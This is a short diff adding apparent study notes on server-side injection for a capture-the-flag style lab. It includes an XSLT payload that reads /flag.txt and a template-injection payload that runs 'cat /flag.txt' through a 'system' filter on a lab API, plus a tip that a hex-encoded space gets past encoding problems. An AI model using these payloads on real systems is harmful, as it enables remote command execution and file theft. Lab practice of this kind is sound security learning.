@@ -59,6 +59,12 @@ Server-Side Includes (SSI) is a technology web applications use to create dynami
 eXtensible Stylesheet Language Transformation (XSLT) is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure.
 - PHP `<xsl:value-of select="php:function('file_get_contents','/flag.txt')" />`
 
+- Skill Assessment ended up being capturing the POST request to truckapi and manipulating the values there. 
+
+`api=http://truckapi.htb/?id%3D{{['cat\x20/flag.txt']|filter('system')}}`
+
+The key was the hexadecimal 'space' - it failed if the space was URL encoded
+
 
 
 
